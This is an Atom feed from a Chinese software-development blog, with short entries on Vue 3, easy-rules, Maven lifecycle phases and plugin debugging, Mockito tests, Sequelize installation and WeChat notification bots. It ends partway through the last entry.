<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>胡言胡语</title>
  
  <subtitle>非学无以广才,非志无以成学</subtitle>
  <link href="https://seniortesting.club/atom.xml" rel="self"/>
  
  <link href="https://seniortesting.club/"/>
  <updated>2021-04-18T13:00:39.463Z</updated>
  <id>https://seniortesting.club/</id>
  
  <author>
    <name>言小妹</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vue3系列(1)-vue3入门介绍</title>
    <link href="https://seniortesting.club/posts/p3eRqr61UtB/"/>
    <id>https://seniortesting.club/posts/p3eRqr61UtB/</id>
    <published>2021-04-18T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    
    
    
    <category term="vue3" scheme="https://seniortesting.club/categories/vue3/"/>
    
    <category term="vue" scheme="https://seniortesting.club/categories/vue3/vue/"/>
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/vue3/vue/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/vue3/vue/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/vue3/vue/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="vue3系列" scheme="https://seniortesting.club/categories/vue3/vue/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue3%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>规则引擎easy-rules</title>
    <link href="https://seniortesting.club/posts/8ou341bh2np/"/>
    <id>https://seniortesting.club/posts/8ou341bh2np/</id>
    <published>2021-04-18T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>在编写代码过程中，我们对于if…else…语句是相当的熟悉了。但是如果条件分支比较多，比如有十几个、几十个、上百个，甚至更多时，如果我们还坚持在业务逻辑代码中使用if…else…语句，那么这个文件中的代码显得十分不协调，并且如果我们以后想再增加或减少规则时，还要来到这块业务逻辑代码中去修改if…else…语句，这给将来的维护带来了一定的不便。<br>        针对这种情况，我们可以考虑使用规则引擎来解决。规则引擎不只一种，本文介绍的是easy rule规则引擎的使用。对于上面的场景，<strong>easy rule会把if…else…中的逻辑从业务逻辑代码中提取出来，并把这些逻辑存放在其他文件中</strong>。这样做以后，业务逻辑代码看上去就清爽了很多。同时如果将来我们想要修改这些规则时，直接去找这些存放规则的文件就行了。<strong>在easy rule中，存放规则有两种方式，一种是使用 .java 文件，另外一种是使用 .yml 文件，下面我们分别介绍</strong>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;使用场景&quot;&gt;&lt;a href=&quot;#使用场景&quot; class=&quot;headerlink&quot; title=&quot;使用场景&quot;&gt;&lt;/a&gt;使用场景&lt;/h2&gt;&lt;p&gt;在编写代码过程中，我们对于if…else…语句是相当的熟悉了。但是如果条件分支比较多，比如有十几个、几十个、上百个，甚至更多</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="easy-rule" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/easy-rule/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>guava工具库接口</title>
    <link href="https://seniortesting.club/posts/u4ou341bh2np/"/>
    <id>https://seniortesting.club/posts/u4ou341bh2np/</id>
    <published>2021-04-18T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="计时器接口"><a href="#计时器接口" class="headerlink" title="计时器接口"></a>计时器接口</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;计时器接口&quot;&gt;&lt;a href=&quot;#计时器接口&quot; class=&quot;headerlink&quot; title=&quot;计时器接口&quot;&gt;&lt;/a&gt;计时器接口&lt;/h2&gt;</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="guava" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/guava/"/>
    
    
  </entry>
  
  <entry>
    <title>maven介绍</title>
    <link href="https://seniortesting.club/posts/nr51gAG3oBtK/"/>
    <id>https://seniortesting.club/posts/nr51gAG3oBtK/</id>
    <published>2021-04-18T12:44:19.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="maven的三种scope的区别"><a href="#maven的三种scope的区别" class="headerlink" title="maven的三种scope的区别"></a>maven的三种scope的区别</h2><p>参考文档： <a href="https://blog.csdn.net/lishuoboy/article/details/100554751" target="_blank" rel="noopener">https://blog.csdn.net/lishuoboy/article/details/100554751</a></p><p>maven的执行生命周期：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">LifecyclePhase</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 三个部分的phase</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一部分的phase, clean相关</span></span><br><span class="line">    PRE_CLEAN( <span class="string">&quot;pre-clean&quot;</span> ),</span><br><span class="line">    CLEAN( <span class="string">&quot;clean&quot;</span> ),</span><br><span class="line">    POST_CLEAN( <span class="string">&quot;post-clean&quot;</span> ),</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 第二部分的默认phase</span></span><br><span class="line">    VALIDATE( <span class="string">&quot;validate&quot;</span> ),  <span class="comment">// </span></span><br><span class="line">    INITIALIZE( <span class="string">&quot;initialize&quot;</span> ),</span><br><span class="line">    GENERATE_SOURCES( <span class="string">&quot;generate-sources&quot;</span> ),</span><br><span class="line">    PROCESS_SOURCES( <span class="string">&quot;process-sources&quot;</span> ),</span><br><span class="line">    GENERATE_RESOURCES( <span class="string">&quot;generate-resources&quot;</span> ),</span><br><span class="line">    PROCESS_RESOURCES( <span class="string">&quot;process-resources&quot;</span> ),</span><br><span class="line">    COMPILE( <span class="string">&quot;compile&quot;</span> ),</span><br><span class="line">    PROCESS_CLASSES( <span class="string">&quot;process-classes&quot;</span> ),</span><br><span class="line">    GENERATE_TEST_SOURCES( <span class="string">&quot;generate-test-sources&quot;</span> ),</span><br><span class="line">    PROCESS_TEST_SOURCES( <span class="string">&quot;process-test-sources&quot;</span> ),</span><br><span class="line">    GENERATE_TEST_RESOURCES( <span class="string">&quot;generate-test-resources&quot;</span> ),</span><br><span class="line">    PROCESS_TEST_RESOURCES( <span class="string">&quot;process-test-resources&quot;</span> ),</span><br><span class="line">    TEST_COMPILE( <span class="string">&quot;test-compile&quot;</span> ),</span><br><span class="line">    PROCESS_TEST_CLASSES( <span class="string">&quot;process-test-classes&quot;</span> ),</span><br><span class="line">    TEST( <span class="string">&quot;test&quot;</span> ),</span><br><span class="line">    PREPARE_PACKAGE( <span class="string">&quot;prepare-package&quot;</span> ),</span><br><span class="line">    PACKAGE( <span class="string">&quot;package&quot;</span> ),</span><br><span class="line">    PRE_INTEGRATION_TEST( <span class="string">&quot;pre-integration-test&quot;</span> ),</span><br><span class="line">    INTEGRATION_TEST( <span class="string">&quot;integration-test&quot;</span> ),</span><br><span class="line">    POST_INTEGRATION_TEST( <span class="string">&quot;post-integration-test&quot;</span> ),</span><br><span class="line">    VERIFY( <span class="string">&quot;verify&quot;</span> ),</span><br><span class="line">    INSTALL( <span class="string">&quot;install&quot;</span> ),</span><br><span class="line">    DEPLOY( <span class="string">&quot;deploy&quot;</span> ),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第三部分默认的phase操作</span></span><br><span class="line">    PRE_SITE( <span class="string">&quot;pre-site&quot;</span> ),</span><br><span class="line">    SITE( <span class="string">&quot;site&quot;</span> ),</span><br><span class="line">    POST_SITE( <span class="string">&quot;post-site&quot;</span> ),</span><br><span class="line">    SITE_DEPLOY( <span class="string">&quot;site-deploy&quot;</span> ),</span><br><span class="line"></span><br><span class="line">    NONE( <span class="string">&quot;&quot;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String id;</span><br><span class="line"></span><br><span class="line">    LifecyclePhase( String id )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">id</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生命周期(lifecycle)由多个阶段(phase)组成,每个阶段(phase)会挂接一到多个goal。goal是maven里定义任务的最小单元，goal分为两类，一类是绑定phase的，就是执行到某个phase，那么这个goal就会触发，另外一类不绑定，就是单独任务，这就相当于ant里的target。</p><p>注意： <strong>执行某个phase，那么它前面所有phase绑定的目标(goal)都会执行</strong>， 每个phase都会邦定maven默认的goal或者没有goal， 或者自定义的goal。</p><p>对应maven插件中的声明的<code>execution</code>选项：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>compile-custom<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br></pre></td></tr></table></figure><p>例如此处的 <code>package</code>,  如果执行命令：<code>mvn package</code>,那么会执行之前所有的<code>clean compile test</code>,不会执行<code>install</code>下面的操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Mojo(</span></span><br><span class="line"><span class="meta">        name = &quot;compile&quot;,</span></span><br><span class="line"><span class="meta">        defaultPhase = LifecyclePhase.GENERATE_SOURCES,</span></span><br><span class="line"><span class="meta">        requiresDependencyResolution = ResolutionScope.COMPILE,</span></span><br><span class="line"><span class="meta">        threadSafe = true</span></span><br><span class="line"><span class="meta">)</span></span><br></pre></td></tr></table></figure><p>上面定义的插件的name就是对应的<code>goal</code></p><h2 id="maven插件的开发和调试"><a href="#maven插件的开发和调试" class="headerlink" title="maven插件的开发和调试"></a>maven插件的开发和调试</h2><p>此处假设我们<strong>maven插件源码项目是A</strong>， <strong>使用插件的项目是B</strong>，进行调试的步骤如下：</p><ol><li>首先在<strong>项目B</strong>中设置<code>mvndebug</code>进行调试监听操作：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 该步骤必须操作将当前的工程包安装到本地仓库中，否则mvndebug会找不到包错误</span></span><br><span class="line">$ mvn clean install -DskipTests</span><br><span class="line">$ mvndebug plugin-groudid:plugin-artifactid:plugin-version:plugin-phase</span><br><span class="line"><span class="comment"># 例如： mvndebug  org.xolstice.maven.plugins:protobuf-maven-plugin:0.7.0-SNAPSHOT:compile</span></span><br></pre></td></tr></table></figure><p>然后会打印如下类似信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pu@LM--24502820 karate-grpc-helper % mvndebug org.xolstice.maven.plugins:protobuf-maven-plugin:0.7.0-SNAPSHOT:compile</span><br><span class="line">Preparing to execute Maven <span class="keyword">in</span> debug mode</span><br><span class="line">Listening <span class="keyword">for</span> transport dt_socket at address: 8000</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从上面可以看到对应的监听端口默认是：<code>8000</code>,后面插件工程A将会使用到这个端口号。</p><ol start="2"><li>回到<strong>插件源码项目A</strong>，在对应的phase的mojo代码中加入相关的断点，并在插件源码工程A中配置<code>java Remote debug</code>运行配置，<br>使用工具IDEA的时候只需要在JVM参数添加如下参数：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-agentlib:jdwp=transport=dt_socket,server=y,<span class="built_in">suspend</span>=n,address=8000</span><br></pre></td></tr></table></figure><ol start="3"><li>然后就是等待项目B执行对应的maven操作，然后就会在插件源码项目A中看到源码会在对应的断点处暂停，此时就可以进行相关的debug操作了。</li></ol><h2 id="maven仓库包发布配置"><a href="#maven仓库包发布配置" class="headerlink" title="maven仓库包发布配置"></a>maven仓库包发布配置</h2><p>操作步骤参考： <a href="https://www.cnblogs.com/exmyth/p/11567579.html" target="_blank" rel="noopener">https://www.cnblogs.com/exmyth/p/11567579.html</a></p><p>按照上面的操作进入地址： <a href="https://issues.sonatype.org/secure/CreateIssue.jspa?issuetype=21&amp;pid=10134" target="_blank" rel="noopener">https://issues.sonatype.org/secure/CreateIssue.jspa?issuetype=21&amp;pid=10134</a> 提交一个issue</p><p>参考一个发布github仓库到对应的oss nuxus仓库的代码：<br><a href="http://bjansen.github.io/java/2021/02/03/deploying-to-maven-central-using-github-actions.html" target="_blank" rel="noopener">http://bjansen.github.io/java/2021/02/03/deploying-to-maven-central-using-github-actions.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;maven的三种scope的区别&quot;&gt;&lt;a href=&quot;#maven的三种scope的区别&quot; class=&quot;headerlink&quot; title=&quot;maven的三种scope的区别&quot;&gt;&lt;/a&gt;maven的三种scope的区别&lt;/h2&gt;&lt;p&gt;参考文档： &lt;a href=</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="maven" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/maven/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="karate" scheme="https://seniortesting.club/tags/karate/"/>
    
  </entry>
  
  <entry>
    <title>mockito工具介绍</title>
    <link href="https://seniortesting.club/posts/83xt51gAG3oBtK/"/>
    <id>https://seniortesting.club/posts/83xt51gAG3oBtK/</id>
    <published>2021-04-18T12:44:19.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>自带的spring-boot-test已经带了mockito:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">    &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">    &lt;exclusions&gt;</span><br><span class="line">        &lt;exclusion&gt;</span><br><span class="line">            &lt;groupId&gt;org.junit.vintage&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;junit-vintage-engine&lt;/artifactId&gt;</span><br><span class="line">        &lt;/exclusion&gt;</span><br><span class="line">    &lt;/exclusions&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>常用操作代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.mockito.junit.jupiter.MockitoExtension;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @RunWith(MockitoJUnitRunner.class)  </span></span><br><span class="line"><span class="meta">@ExtendWith(MockitoExtension.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileProcessorTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Mock</span></span><br><span class="line">    <span class="keyword">private</span> FileClient fileClient;</span><br><span class="line">    <span class="meta">@InjectMocks</span></span><br><span class="line">    <span class="keyword">private</span> FileProcessor fileProcessor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">testUploadFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        FileUploadResponse fileUploadResponse = FileUploadResponse.newBuilder().build();</span><br><span class="line">        Mockito.when(fileClient.uploadFile(anyString(), any(<span class="keyword">byte</span>[].class))).thenReturn(fileUploadResponse);</span><br><span class="line">        Assert.assertTrue(fileProcessor.uploadFile(<span class="string">&quot;test&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;    </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Mock-和-InjectMocks-的区别？"><a href="#Mock-和-InjectMocks-的区别？" class="headerlink" title="@Mock 和 @InjectMocks 的区别？"></a>@Mock 和 @InjectMocks 的区别？</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;配置&quot;&gt;&lt;a href=&quot;#配置&quot; class=&quot;headerlink&quot; title=&quot;配置&quot;&gt;&lt;/a&gt;配置&lt;/h2&gt;&lt;p&gt;自带的spring-boot-test已经带了mockito:&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;ta</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="mockito" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/mockito/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>sequelize系列(1)-学习介绍</title>
    <link href="https://seniortesting.club/posts/zgt94265w4/"/>
    <id>https://seniortesting.club/posts/zgt94265w4/</id>
    <published>2021-04-18T07:26:05.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sequelize介绍"><a href="#sequelize介绍" class="headerlink" title="sequelize介绍"></a>sequelize介绍</h2><p>Sequelize是基于Node.js语言的ORM框架，用于Postgres，MySQL，MariaDB，SQLite和Microsoft SQL Server。它具有可靠的事务支持，关系，快速和延迟加载，读取复制等功能。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>可以通过npm（或yarn）获得<code>Sequelize</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --save sequelize</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>您还必须为所选的数据库手动安装驱动程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> One of the following:</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm install --save pg pg-hstore <span class="comment"># Postgres</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm install --save mysql2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm install --save mariadb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm install --save sqlite3</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm install --save tedious <span class="comment"># Microsoft SQL Server</span></span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1101571555324224" target="_blank" rel="noopener">廖雪峰的简单介绍</a></li><li><a href="https://sequelize.org/master/manual/migrations.html" target="_blank" rel="noopener">官方文档</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;sequelize介绍&quot;&gt;&lt;a href=&quot;#sequelize介绍&quot; class=&quot;headerlink&quot; title=&quot;sequelize介绍&quot;&gt;&lt;/a&gt;sequelize介绍&lt;/h2&gt;&lt;p&gt;Sequelize是基于Node.js语言的ORM框架，用于Post</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="node系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/node%E7%B3%BB%E5%88%97/"/>
    
    <category term="sequelize" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/node%E7%B3%BB%E5%88%97/sequelize/"/>
    
    
    <category term="sequelize" scheme="https://seniortesting.club/tags/sequelize/"/>
    
    <category term="orm" scheme="https://seniortesting.club/tags/orm/"/>
    
  </entry>
  
  <entry>
    <title>wechat消息机器人解决方案对比</title>
    <link href="https://seniortesting.club/posts/2515MK9/"/>
    <id>https://seniortesting.club/posts/2515MK9/</id>
    <published>2021-04-17T02:12:58.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们平时需要使用到微信的消息提醒,市面上几种流行的微信通知解决方案.</p><ol><li>企业微信</li><li>Telegram</li><li>酷推</li><li>qmsg酱</li><li>pushplus酱</li><li>server酱</li></ol><p>自己可搭建的微信消息方案,nodejs方案: <a href="https://github.com/wechaty/wechaty" target="_blank" rel="noopener">https://github.com/wechaty/wechaty</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/Wenmoux/checkbox/blob/master/sendmsg.js" target="_blank" rel="noopener">通用微信通知方案源码</a></li></ul>]]></content>
    
    
      
      
